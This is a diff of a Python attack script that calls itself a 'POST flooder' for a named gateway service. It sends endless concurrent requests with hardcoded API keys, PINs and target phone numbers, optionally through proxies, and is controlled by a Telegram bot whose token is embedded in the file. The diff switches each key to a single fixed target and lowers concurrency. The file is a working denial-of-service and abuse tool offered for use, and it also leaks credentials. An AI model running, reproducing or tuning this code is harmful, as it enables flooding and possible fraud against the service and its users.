@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 Stable POST flooder for txg-gateway.xyz with Telegram bot control.
-4 API keys with multiple target numbers, auto‑rotation.
+4 API keys, each with one specific target number.
 """
 import asyncio
 import aiohttp
@@ -26,29 +26,29 @@ BOT_TOKEN = os.getenv("BOT_TOKEN", "8711419221:AAGx9Rylji34qJeOShWZk0gQkv9YPZ7fX
 ADMIN_ID = int(os.getenv("ADMIN_ID", "8401097557"))
 
 # ─── ATTACK CONFIG ──────────────────────────────────────
-# 4 API keys with multiple target numbers
+# 4 API keys – each with single target number
 CONFIGS = [
     {
         "api_key": "86864a72c5e2f3ad32c1c8f52710959f",
-        "toUsers": ["6283146815", "9359202969", "9359202968"],
+        "toUser": "6283146815",
         "secret_pin": "1234",
         "remark": "Ultra pelo",
     },
     {
         "api_key": "f692ed462bc0976b5332a11944103df7",
-        "toUsers": ["9359202969", "9359202968", "9359202967"],
+        "toUser": "9359202969",
         "secret_pin": "1234",
         "remark": "Ultra pelo",
     },
     {
         "api_key": "befd28e1b9ba8557fb7f192fc1647e12",
-        "toUsers": ["9359202967", "6283146815", "9359202969"],
+        "toUser": "9359202969",
         "secret_pin": "1234",
         "remark": "TXG PELO",
     },
     {
         "api_key": "ecc00db3db1ed5e9df931ff19cd74b58",
-        "toUsers": ["9359202967", "6283146815", "9359202968"],
+        "toUser": "6283146815",
         "secret_pin": "1234",
         "remark": "TXG PELO",
     }
@@ -76,7 +76,7 @@ BASE_HEADERS = {
 }
 
 # ─── PERFORMANCE SETTINGS ──────────────────────────────
-CONCURRENT = 600               # parallel requests (adjust for Railway)
+CONCURRENT = 300               # parallel requests (adjust for Railway)
 TOTAL_REQUESTS = 0             # 0 = infinite
 USE_PROXIES = False
 PROXY_FILE = "proxies.txt"
@@ -88,7 +88,6 @@ start_time = time.time()
 flooder_running = True
 flooder_task_obj = None
 
-# ─── PROXY LOADER (optional) ───────────────────────────
 def load_proxies():
     try:
         with open(PROXY_FILE) as f:
@@ -99,11 +98,9 @@ def load_proxies():
 # ─── ASYNC REQUEST WORKER ──────────────────────────────
 async def fire(session, sem, config, proxy=None):
     async with sem:
-        # Random target from the key's list
-        to_user = random.choice(config["toUsers"])
         headers = {**BASE_HEADERS, "Cookie": f"api_key={config['api_key']}"}
         payload = {
-            "toUser": to_user,
+            "toUser": config["toUser"],
             "amount": 1,
             "api_key": config["api_key"],
             "secret_pin": config["secret_pin"],
@@ -114,8 +111,7 @@ async def fire(session, sem, config, proxy=None):
         try:
             async with session.post(URL, json=payload, headers=headers, proxy=proxy, ssl=False, timeout=5) as resp:
                 status = resp.status
-                # read response to avoid warnings
-                await resp.text()
+                await resp.text()  # consume response
             async with lock:
                 stats['sent'] += 1
                 if 200 <= status < 400:
@@ -144,15 +140,12 @@ async def flooder_loop():
             tasks.add(task)
             count += 1
 
-            # Limit task accumulation to avoid memory leak
             if len(tasks) > CONCURRENT * 2:
                 done, tasks = await asyncio.wait(tasks, timeout=0, return_when=asyncio.FIRST_COMPLETED)
                 tasks = set(tasks)
 
-            # Yield control to event loop
             await asyncio.sleep(0)
 
-        # Wait for remaining tasks
         if tasks:
             await asyncio.wait(tasks, timeout=10)
         logger.info("Flooder stopped.")
@@ -222,7 +215,7 @@ async def send_periodic_report(context: ContextTypes.DEFAULT_TYPE):
            f"⚡ Rate: {rate:.1f} req/s")
     await context.bot.send_message(chat_id=ADMIN_ID, text=msg)
 
-# ─── HEALTH CHECK WEB SERVER (for Railway) ─────────────
+# ─── HEALTH CHECK WEB SERVER ─────────────────────────────
 async def health(request):
     return web.Response(text="Flooder is online", status=200)
 
@@ -234,16 +227,13 @@ async def run_webserver():
     site = web.TCPSite(runner, host='0.0.0.0', port=int(os.getenv("PORT", "8080")))
     await site.start()
     logger.info("Web server started on port %s", os.getenv("PORT", "8080"))
-    # Keep the server running
     await asyncio.Event().wait()
 
 # ─── MAIN ──────────────────────────────────────────────────
 async def main():
     global flooder_task_obj
-    # Start flooder
     flooder_task_obj = asyncio.create_task(flooder_loop())
 
-    # Start Telegram bot
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("status", status_command))
@@ -254,19 +244,16 @@ async def main():
     if job_queue:
         job_queue.run_repeating(send_periodic_report, interval=30, first=10)
 
-    # Send startup notification
-    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Flooder online** – 4 keys, multiple targets.\n/status for stats, /stop to halt.")
+    await app.bot.send_message(chat_id=ADMIN_ID, text="🔥 **Flooder online** – 4 keys, single targets each.\n/status for stats, /stop to halt.")
 
-    # Start bot polling and web server concurrently
     await app.initialize()
     await app.start()
     await app.updater.start_polling()
 
-    # Run web server alongside
     try:
         await asyncio.gather(
             run_webserver(),
-            asyncio.Event().wait()  # keep main alive
+            asyncio.Event().wait()
         )
     except asyncio.CancelledError:
         pass
